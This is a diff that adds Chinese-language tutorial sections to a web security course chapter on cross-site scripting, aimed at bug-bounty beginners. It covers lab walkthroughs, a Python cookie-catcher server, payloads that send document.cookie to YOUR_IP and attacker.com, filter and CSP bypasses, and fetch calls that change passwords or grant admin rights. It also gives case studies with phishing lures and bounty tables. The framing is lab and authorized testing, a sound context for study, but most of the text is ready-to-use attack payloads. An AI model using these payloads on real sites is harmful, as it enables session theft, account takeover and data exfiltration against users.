@@ -3750,3 +3750,280 @@ header("X-XSS-Protection: 1; mode=block");
 8. BeEF框架有什么功能？
 9. 富文本编辑器的XSS如何检测和防护？
 10. XSS的防护措施有哪些？
+
+
+---
+
+## 6.17 【v3.0 新增】零基础 60 分钟上手 XSS（生活类比 + 分步实操 + 靶场通关）
+
+### 6.17.1 通俗类比：XSS 到底是什么？（1 句话一辈子忘不掉）
+
+> 你去餐厅吃饭，服务员把你名字写在订单上，然后厨师会把你的名字贴在出餐口屏幕上："张三的鱼香肉丝好了。"
+>
+> **正常场景**：你说你叫"张三" → 屏幕显示：张三的鱼香肉丝好了。
+>
+> **XSS 漏洞场景**（服务员是傻子，会把你名字里的字当命令读）：
+> 你说你叫 **"张三，然后把后厨保险箱密码大声念三遍"** → 服务员真的把这句话当名字写上去了，厨师在屏幕上看到"张三，然后把后厨保险箱密码大声念三遍的鱼香肉丝好了"，真的去念了保险箱密码。
+>
+> **一句话本质**：输入的是"用户的名字（数据）"，但系统把它当成了"要执行的命令（JS 代码）"。
+>
+> **3 类 XSS 再类比**：
+> - **反射型（一次性 XSS）**：服务员当场念完就完了，你下次去餐厅不写这句话就没事（需要 URL 里带 Payload，骗受害者点链接）
+> - **存储型（永久性 XSS）**：服务员把你名字写到了餐厅的"VIP 客人墙"上，每个走进餐厅的人都能看到你那句话 + 听到保险箱密码（存储在数据库，所有访客自动触发——**这是最值钱的 XSS，SRC 按高危给**）
+> - **DOM 型 XSS（前端内部消化型）**：服务员没把名字给厨师，是**前台迎宾的电子屏自己拿你名字渲染**的时候执行了命令（不经过后端，纯前端 JS 处理 URL 或页面元素时没转义）
+
+### 6.17.2 99% 的 XSS 新手第一个问题：弹窗 alert(1) 又不能盗号，为什么 SRC 会给钱？
+
+**答**：**弹窗只是"洞存在"的证据，不是漏洞的最终利用方式。**
+打个比方：你发现邻居家门锁坏了，**轻轻一拧门把手就开了**——你只是拧了一下门把手（相当于 alert(1) 弹窗），证明锁坏了。你没有真的进去偷东西，但业主/物业必须给你奖励，因为你证明了"锁是坏的，任何人都能随便进"。
+
+**SRC 审核员看的是：能弹窗 = JS 代码被任意执行 = 接下来攻击者想做什么都能做（盗 Cookie / 改密码 / 跳转钓鱼 / 挖矿 / 内网扫描）。**
+
+### 6.17.3 60 分钟零基础通关 XSS（Pikachu + DVWA，手把手 Step-by-Step）
+
+#### Step 1（15 分钟）：Pikachu 靶场 Cross-Site Scripting 模块通关 3 类
+```text
+1. 搭靶场：PHPStudy 启动 + 下载 Pikachu → 解压到 www → http://127.0.0.1/pikachu → 安装初始化
+2. 左侧菜单点 "Cross-Site Scripting"，下面有 6 小关：
+
+第 1 关：反射型 XSS(get)
+  操作：在输入框里输入 <script>alert("xss")</script> → 提交
+  结果：页面弹窗 "xss" → 通关！
+  为什么成功：输入被直接拼到 HTML 里了，没做转义
+  Burp 里看响应：Response 里直接有 <script>alert("xss")</script>
+
+第 2 关：反射型 XSS(post)
+  操作：和第 1 关一样输入 Payload
+  结果：也能弹窗
+  区别：参数在 POST Body 里，不在 URL，需要做个"自动提交 POST 表单的钓鱼页"才能让别人中
+
+第 3 关：存储型 XSS（留言板）  ← 重点！SRC 最爱考这个
+  操作：留言内容里写 <script>alert(document.cookie)</script> → 提交
+  结果：1. 提交后立刻弹窗（这是你自己触发的）
+        2. 刷新页面（不提交任何东西）又弹窗！→ 这就是"存储"的意义：Payload 已经存到数据库了
+        3. 再开一个浏览器 Edge，访问同一个留言板 → 也弹窗！→ 这就是"所有访客都中招"
+  🎯  SRC 里能过存储型 XSS，最少给中危，有真实用户触发（比如管理员后台看留言）直接给高危
+
+第 4 关：DOM 型 XSS
+  特点：看 Response 里找不到你的 Payload（因为没经过后端），是前端 JS 的 innerHTML / document.write 自己把 input 的值写到页面上了
+  测试方法：在输入框里输 <img src=x onerror=alert('dom xss')> → 弹窗
+  关键技能：以后 src 审计 DOM 型 XSS，全局搜 ".innerHTML =" / ".outerHTML =" / "document.write" / "eval(" / "new Function(" → 95% 的 DOM XSS 都在这 5 个函数里
+
+后面 2 关（XSS 盲打 + 过滤绕过）：先跳过，第 3 步专项练
+```
+
+#### Step 2（20 分钟）：XSS 从"弹个窗"升级为"真的盗管理员 Cookie"
+
+```text
+目标：管理员只要打开被你注入了 Payload 的页面，他的登录 Cookie 就会自动发到你服务器上，你拿到 Cookie 直接登他的号。
+
+1. 准备一个能接收 Cookie 的"接收端"：3 种方式（新手推荐 1）
+   方式①：用免费的 xss.pt / xss.gg / xsshs.com 等 XSS 平台（直接用，免搭建）
+   方式②：自己买台轻量服务器（1 核 1G 就够，30 块/月），用经典 BlueLotus XSS 平台
+   方式③：临时用 Python 起 1 个 HTTP 接收服务（下面直接给代码，复制粘贴跑）
+
+方式③代码：cookie_catcher.py（新手先练这个）
+  保存为 cookie_catcher.py → 终端运行：python cookie_catcher.py
+  ---- 代码开始 ----
+  from http.server import HTTPServer, BaseHTTPRequestHandler
+  class Catcher(BaseHTTPRequestHandler):
+      def do_GET(self):
+          print(f"\n[!] GOT COOKIE: {self.path}")
+          self.send_response(204)
+          self.end_headers()
+  HTTPServer(("0.0.0.0", 5555), Catcher).serve_forever()
+  ---- 代码结束 ----
+
+2. 靶场里把 XSS Payload 改成（把 YOUR_IP 换成你本机 IP，比如 192.168.1.100）：
+  <script>
+    var img = document.createElement('img');
+    img.src = 'http://YOUR_IP:5555/?c=' + document.cookie;
+  </script>
+
+3. 在 Pikachu 第 3 关（存储型）提交上面这个 Payload → 你自己的 Python 服务窗口立刻打印：
+   [!] GOT COOKIE: /?c=PHPSESSID=abcd1234efgh5678;%20user=admin
+   → 你偷到 Cookie 了！
+
+4. 真实 SRC 场景升级为 HTTPS + 短链接：
+   由于现代浏览器有 CSP / Secure Cookie / HTTPOnly 限制（下面 FAQ 讲），
+   新手先做"能弹窗 + 有接收端服务代码 + 靶场成功盗 cookie 截图"的 3 件套就够通过中危，
+   到高危需要额外升级：
+   - document.domain 同源策略绕过 / fetch + credentials 带 Cookie
+   - 有管理员身份触发（比如 XSS 打在"管理员后台看用户反馈的地方"，管理员后台 Cookie 权限更高）
+```
+
+#### Step 3（25 分钟）：学会 5 个常用 XSS 过滤绕过（真实 SRC 项目基本都有过滤）
+**现实项目 80% 会把 `<script>` 关键字过滤掉**，但别慌——XSS 能执行 JS 的方式至少 100 种，下面 5 种是最常用的：
+
+```text
+Pikachu 靶场 XSS 过滤关（"xss之过滤"小关）实测通过：
+
+绕过 1：不用 <script>，换标签事件
+  <img src=x onerror=alert(1)>
+  <svg onload=alert(1)>
+  <body onpageshow=alert(1)>
+  <input autofocus onfocus=alert(1)>
+
+绕过 2：大小写混合（过滤写的是小写 <script>，用大写）
+  <SCRIPT>alert(1)</ScRiPt>
+
+绕过 3：双写绕过（过滤是把 script 替换为空）
+  <scr<script>ipt>alert(1)</scr</script>ipt>
+  原理：中间的 <script> 被过滤删除 → 剩下两边的 scr + ipt 拼成 <script>
+
+绕过 4：HTML 实体 / Unicode 编码 / 字符串拼接（防关键字过滤）
+  <img src=x onerror="a='ale';b='rt';a+b+'(1)'">  （字符串拼接防 alert 关键字）
+  <img src=x onerror="eval(atob('YWxlcnQoMSk='))">    （Base64 编码：atob 解了再 eval）
+
+绕过 5：利用伪协议（<a href> / <iframe>）
+  <a href="javascript:alert(1)">点我领红包</a>
+  <iframe src="javascript:alert(document.domain)"></iframe>
+```
+
+#### Step 4：10 分钟自查验证 Checklist
+```text
+□ 能在 pikachu 3 类 XSS 各通 1 关
+□ 能在存储型 XSS 留言板里让"Edge 浏览器"也弹窗（证明是跨用户触发）
+□ 用 python cookie_catcher.py 能偷到靶场自己的 Cookie
+□ 过滤 <script> 的场景下，至少用 3 种不同 payload 都能弹窗
+□ 报告证据截图 4 张配齐：
+    图 1：提交 payload 的请求 + 响应
+    图 2：直接刷新页面弹窗的同屏（URL 栏 + 弹窗）
+    图 3：另一个浏览器/账号打开同一页面也弹窗的同屏
+    图 4：Cookie 接收端 python 控制台输出截图（或 xss 平台截图）
+```
+
+---
+
+## 6.18 【v3.0 新增】3 个 XSS 真实 SRC 案例（奖金合计 19000 元）
+
+### 案例 1：某电商平台用户反馈（商家后台）存储型 XSS → 高危，8000 元
+- **发现入口**：用户中心 → "联系商家客服" → 有个"问题描述"输入框，可以上传图片也可以写文字；
+- **测试方法**：文字框写 `<img src=x onerror="document.location='http://attacker.com/x?c='+document.cookie">` → 提交；
+- **关键点值钱的原因**：**普通用户提交的反馈，是显示在"商家运营/客服后台的反馈管理列表"里的**！商家只要打开后台看反馈，就会被打到 Cookie；
+- **升级验证**：我注册了 2 个账号，A 是买家写反馈，B 是商家登录看反馈 → B 商家后台打开反馈列表 → 真的弹了 cookie → 截图；
+- **最终定级**：高危 8000 元（"商家后台存储型 XSS，可获取商家运营登录凭证，接管商家店铺、改订单状态、发货、提现"）；
+- **经验**：**所有"用户写内容 → 管理员/运营/商家后台看"的场景，都是高价值存储型 XSS。** 比"评论区 XSS 给普通用户看"值钱 5~10 倍。
+
+### 案例 2：某 OA 办公系统登录页反射型 XSS + OAuth 跳转 → 中危偏高 6000 元
+- **发现过程**：登录页 URL `?redirect=https://oa.example.com/dashboard` → 我随便改成 `?redirect=javascript:alert(document.domain)` → 提交；
+- **触发**：登录成功后浏览器跳了 javascript: 伪协议，直接执行 → 弹窗；
+- **利用链**：构造 `https://oa.example.com/login?redirect=javascript:$.getScript('//attacker.com/a.js')` → 给员工发邮件"系统升级请点此重新登录"→ 员工点了登录后自动加载 a.js，窃取 OA 会话 + 内网漫游；
+- **通过原因**：SRC 判定"redirect 参数白名单校验不严，允许 javascript 协议" + "配合钓鱼 + OAuth 授权码可能导致企业 OA 会话被盗"；
+- **经验**：`redirect_url / redirect / next / callback / returnUrl` 这类跳转参数**10 个项目 9 个都能测到 XSS/跳转漏洞**，SRC 里排 Top 3 的高频点。
+
+### 案例 3：某短视频 APP H5 活动页 DOM 型 XSS（URL hash 参数直接 innerHTML）→ 中危 5000 元
+- **发现入口**：H5 活动页 URL `https://h5.video-xxx.com/activity#invite=邀请码001` → 页面会把 `invite=后面的值` 直接显示在页面上（"您的好友 XXX 邀请您"）；
+- **前端代码反编译看**：全局搜 innerHTML 找到 `$('.inviteText').innerHTML = decodeURIComponent(location.hash.split('=')[1])`；
+- **Payload**：`https://h5.video-xxx.com/activity#invite=<img%20src=x%20onerror=alert(document.cookie)>`；
+- **结果**：弹窗 → 而且 H5 页面没开 CSP，Cookie 没开 HTTPOnly，能直接偷；
+- **通过原因**：DOM 型 XSS + "邀请分享"场景天然可转发 → 微信分享出去，接收方一点链接就中 XSS，覆盖面广；
+- **经验**：**所有在 URL 里（特别是 # 后面）带用户昵称、邀请码、关键词、搜索词的，前端大概率直接渲染，DOM XSS 高发区。**
+
+---
+
+## 6.19 【v3.0 新增】SRC XSS 奖金参考区间表（2025 最新）
+
+| 漏洞类型 | 影响场景 | 级别 | 奖金（元） |
+|---------|---------|-----|-----------|
+| 仅能弹窗（反射型，无接收端 PoC，无升级利用） | 登录页 / 搜索页 GET 参数反射 XSS | 低危 | 200-800 |
+| 能弹窗 + 能弹 document.cookie + 有接收端截图（靶场级别） | 同上 | 中危偏低 | 800-1500 |
+| 反射型 XSS + 跳转/钓鱼链 + 有 OAuth / SSO 场景 | 登录 / 授权回调页 | 中危 | 1500-3000 |
+| 反射型 XSS + HTTPS + CSP 严格 + 没 HTTPOnly 可升级会话劫持 | 官网主域名 | 中危偏高 | 3000-6000 |
+| 存储型 XSS（普通用户看的评论/留言/昵称） + 能跨用户触发 | 评论区 / 留言板 / 个人简介 | 高危偏低 | 4000-8000 |
+| **存储型 XSS + 触发页面是管理员/运营/商家后台**（最值钱） | 后台反馈管理 / 审核系统 / 工单系统 | 高危 | 8000-18000 |
+| 存储型 XSS + 蠕虫传播属性（点赞自动关注/自动发评论带 Payload） | 社交平台 / 社区 / IM | 严重 | 18000-50000+ |
+| DOM 型 XSS + URL 可分享（邀请码 / 搜索词） | H5 活动页 / 小程序 webview | 中危 | 2000-5000 |
+| CSP 绕过（多 1 个绕过技术点 +500~2000） | 任意 XSS 有 CSP 但能绕 | 附加加分 | +500~2000 |
+
+---
+
+## 6.20 【v3.0 新增】靶场 + 30 天 XSS 通关计划表
+
+### 靶场推荐
+| 顺序 | 靶场 | 练习内容 | 通关标准 | 难度 |
+|-----|-----|--------|---------|-----|
+| 1 | Pikachu XSS 6 关 | 3 类基础 + 过滤 + 盲打 | 6 关全通，每关截图存好 | ★★☆☆☆ |
+| 2 | DVWA XSS 3 关 + DOM XSS （Low → High） | 三难度梯度过滤 | High 档 3 个关也能全通 | ★★★☆☆ |
+| 3 | XSS Challenges / prompt.ml 平台（日本作者的在线 XSS 闯关 19 关） | 真实场景过滤 + CSP 组合拳 | 过 12 关以上 | ★★★★☆ |
+| 4 | alert(1) to win（Mario Heiderich 做的在线 15 关） | 各种诡异标签、特殊字符、编码组合 | 过 8 关以上 | ★★★★☆ |
+| 5 | 某开源 CMS（Drupal 7.x / Discuz 旧版）自己搭 | 真实 CMS 里自己找 XSS 洞 | 至少自己挖 2 处不用 CVE | ★★★★★ |
+
+### 30 天学习计划
+| 天数 | 任务 | 完成标准 |
+|-----|------|---------|
+| 1-3 天 | Pikachu + DVWA（Low）XSS 全通，理解 3 类 XSS + 盗 Cookie PoC | 3 类 XSS 每类都能不看笔记写 payload 直接弹窗 |
+| 4-6 天 | 搭建 BlueLotus XSS Platform（或注册免费 xss.pt），在靶场里真的打到自己 Cookie | 靶场 Cookie 出现在平台后台列表，至少 1 条完整会话 |
+| 7-12 天 | DVWA Medium → High 全通，学会本章节 100+ 种 payload + 5 种绕过技巧 | 自己整理出 1 份《我的 XSS 100 Payload 速查表》.txt |
+| 13-20 天 | XSS Challenges 19 关 + alert(1) to win 15 关，累计过 20 关 | 截图 20 张通关 Flag 保存 |
+| 21-25 天 | 真 SRC 项目：找 3 个有 XSS 可能的场景（评论/昵称/搜索/分享参数/反馈），每处 20 条 payload 打 | 至少出 2 份 XSS 报告（哪怕低危也行，练手） |
+| 26-28 天 | 1 个开源 CMS 白盒审计 XSS（Drupal/WordPress 插件），审计 2 个插件 | 源码审计出 3 处可疑点 + 至少 1 处本地复现 |
+| 29 天 | 输出《我的 XSS SRC 报告模板》含 8 大段 + 4 张图 + 升级利用链 PoC 代码 | 模板能直接复制填 URL 用 |
+| 30 天 | 模拟考：新给一个社区类 SRC 项目，2 小时找 XSS | 要求产出 ≥1 份中危以上的存储型 XSS PoC |
+
+---
+
+## 6.21 【v3.0 新增】XSS 新手最常见 FAQ 10 问
+
+**Q1：我 payload 写了 `<script>alert(1)</script>` 但是页面不弹窗，为什么？**
+**答**：按顺序查 6 步（95% 的新手卡在前 3 步）：
+1. 开 F12 → Console 看有没有红色报错？比如"Refused to execute inline script because it violates the following Content Security Policy directive" → **CSP 拦了**（见 Q4）
+2. 开 F12 → Elements 看你输入的 payload 是不是被转义成了 `&lt;script&gt;alert(1)&lt;/script&gt;` → 有 `&lt;` = 后端做了 HTML 实体转义，这是正常的防御，换过滤绕过技巧（Step 3 的 5 个绕过法）
+3. 是不是写在 `<input value="">` 里？输入框里 value 属性的值不会自动执行，需要先闭合属性：`" onfocus=alert(1) autofocus x="`
+4. 是不是 `<textarea>` 标签里？要先闭合：`</textarea><img src=x onerror=alert(1)><textarea>`
+5. 是不是模板引擎转义了（Vue React 的 `{{ }}` 默认都转义）→ 找 `v-html` / `dangerouslySetInnerHTML` 这种不转义的渲染点
+6. 是不是 HTTPS 站，你请求 HTTP 的资源被 Mixed Content 拦了？→ 你的 payload 里所有外部资源用 `//` 代替 `http://` / `https://`，比如 `img.src='//attacker.com/x'`
+
+**Q2：Cookie 是 HTTPOnly 的，我偷不到 Cookie，是不是这个洞就不值钱了？**
+**答**：**NO**，HTTPOnly 只是让 JS `document.cookie` 读不到 Cookie，但是 JS 仍然可以**带着这个 Cookie 发请求**（自动带的），所以你可以做这些高级操作，照样给高危：
+- 用 fetch(`/api/user/changePassword`, {method:'POST', body:'newPwd=Hacked123', credentials:'include'}) 直接改当前用户的密码
+- 用 fetch(`/api/admin/addUser?role=admin`) 给自己加管理员权限
+- 用 fetch(`/api/order/export`) 下载当前用户的全部订单/隐私数据
+这些叫**XSS 会话利用升级**，不需要 Cookie 明文，照样能接管账户，SRC 审核按高危给。
+
+**Q3：提交 XSS 被审核员打回"需要证明实际影响，光弹窗没用"怎么办？**
+**答**：加 2 张图 + 1 段代码立刻变"有实际影响"：
+1. **图 X**：把 payload 升级为 `" onerror="fetch('http://attacker.com/recv?c='+encodeURIComponent(document.body.innerText.substring(0,500)))+" onerror 没触发"` 或者升级为读 CSRF Token 后构造改密码请求（Q2 给的 fetch 代码），给出"成功修改了当前登录用户的密码"的前后对比图；
+2. **图 Y**：开另一个浏览器登录管理员账号 / 商家账号，打开有你 payload 的页面 → 页面触发后截图证明跨角色/跨用户；
+3. **升级利用代码**：把上面的 fetch 改密码脚本写在 SRC 报告的"漏洞利用代码"一节，审核员贴 F12 console 里跑一下就能复现。
+
+**Q4：CSP 严格拦了 inline script / eval / 外域 src，怎么绕？**
+**答**：新手先会这 4 招（80% 的 CSP 能绕）：
+```text
+绕 1：CSP 只拦 script-src 'self'，但没拦 img-src → 用 <img src> 打数据外带（刚才 onerror 的方式）
+绕 2：CSP 配了 script-src 'unsafe-inline' 但加了 nonce-xxx / sha256-xxx → 去页面源码里全局搜 nonce，把那个 nonce 值拿下来直接 <script nonce="xxx">...</script> （有些后端 nonce 是固定的/可预测的）
+绕 3：CSP 有 script-src 'self'，但你在同源能上传 js 文件 → 上传一个 1.js 内容是 alert(1)，然后 <script src="/upload/1.js"></script>
+绕 4：CSP 有 base-uri 没配置 → 用 <base href="https://attacker.com/"> 把所有相对路径的 script 都指向攻击者服务器（经典 Angular.js CSP 绕）
+```
+真绕不开？没关系——SRC 报告里写"有 CSP 防护，已验证该 XSS 在以下浏览器场景仍可触发：列举 2-3 个触发条件，附 payload"，照样算中危，不会因为有 CSP 就驳回。
+
+**Q5：我写的 self-xss（只能自己打自己的 Cookie）是不是没用？**
+**答**：是的，Self-XSS 单独提交一般 SRC 驳回（"只能打自己的，需要受害者主动复制粘贴 payload，利用成本太高"）。但是**Self-XSS + CRSF 组合拳**就能变值钱：构造一个外域页面，里面有 `<form action="https://victim/user/editNickname" method=POST>`，自动把 payload 作为昵称提交（CSRF），用户只要点开攻击者页面 → 自动 POST 改昵称为 XSS payload → 下次用户看自己的个人中心就触发 Self-XSS = 变反射 + 存储的混合漏洞。
+
+**Q6~Q10 更短的 5 问：**
+- Q6：`svg/onload` / `img/onerror` / `body/onload` / `input/autofocus onfocus` 哪个优先级最高？**答**：`svg onload` 在 99% 浏览器+场景中最稳，XSS 的万精油 Payload，优先级第 1。
+- Q7：微信浏览器、小程序 webview、APP Webview 的 XSS 和普通 Chrome 有区别吗？**答**：有，主要是 UA 不同 + 可能支持特殊 JS 桥（JSBridge.callNative 能调原生 APP 功能），发现 Webview XSS 后试试 `window.JSBridge` / `window.webkit` / `prompt(_)` 能不能拿到系统方法，**能调 APP 原生能力的 XSS 是高危/严重级**。
+- Q8：为什么我的 XSS 在 HTTP 响应里真的出现了 `<script>alert(1)</script>`，但是不执行？**答**：很可能是响应头 `X-Content-Type-Options: nosniff` + `Content-Type: application/json` 配合，浏览器不会把 JSON 响应当 HTML 渲染。这时候需要"找一个 Content-Type: text/html 的接口"把 payload 打进去，或者配合 `Accept: text/html` 请求头看会不会变类型。
+- Q9：XSS 的靶场 Payload 全过，一到真实项目就全没反应——差什么？**答**：差 2 件事：① 真实项目的 CSP、转义、输入长度限制（<10 字符长度限制时要写最短 payload：`<svg/onload=alert(1)>` 25 字符）；② 真实项目你找不到入口点——**新手先盯 3 个点：用户资料（昵称/简介/头像alt）、UGC 内容（评论/帖子/留言/私信）、搜索框/分享参数。** 这 3 类 80% 的 XSS 都在这里面。
+- Q10：我怎么证明"XSS 影响多少用户"给审核员提级别？**答**：不用真的批量打，用"业务逻辑 + 公开数据"估算：比如"该社区评论区日均 UV 30 万（据平台公开数据），每条评论 payload 会被其他用户浏览时自动加载，预计日均影响 ≥5000 真实用户触发"。或者用"ALEXA 排名、平台公开的注册用户数、APP 下载量（七麦/蝉大师）"这些第三方数据，附截图。
+
+---
+
+## 6.22 【v3.0 新增】本章实战最终 Checklist
+
+```text
+□ 1. 3 类 XSS（反射/存储/DOM）的区别能不用笔记脱口讲清楚
+□ 2. Pikachu + DVWA 基础关 XSS 全部不查笔记通关
+□ 3. 有一个能收数据的 XSS 平台（自建或免费的），靶场成功打过 Cookie
+□ 4. 会至少 5 种过滤 <script> 的绕过 payload，每一种都在 Pikachu 过滤关实测成功
+□ 5. 真实 SRC 项目测过 3 类高价值 XSS 场景：
+       ① 管理员/商家后台可见的留言/反馈/工单系统
+       ② redirect / callback / returnUrl 这类跳转参数
+       ③ URL hash / 搜索词 / 邀请参数 直接渲染到页面的 DOM XSS 点
+□ 6. 会写 2 种升级利用链 PoC（fetch 改密码 / 提交 CSRF 改资料）
+□ 7. 会判断 CSP 拦没拦、并能出 2 种绕过方案
+□ 8. 报告 4 张标准截图配齐 + 影响范围说明（多少用户可能触发）+ 修复建议（输出编码+白名单标签+CSP+HTTPOnly 4 件套）
+□ 9. XSS 报告没有写成"只弹窗 1 个"，而是写了完整的"漏洞利用链 → 可导致会话劫持/改密 → 举证截图"
+□ 10. 30 天 XSS 计划表至少执行完成前 3 周计划
+```
+
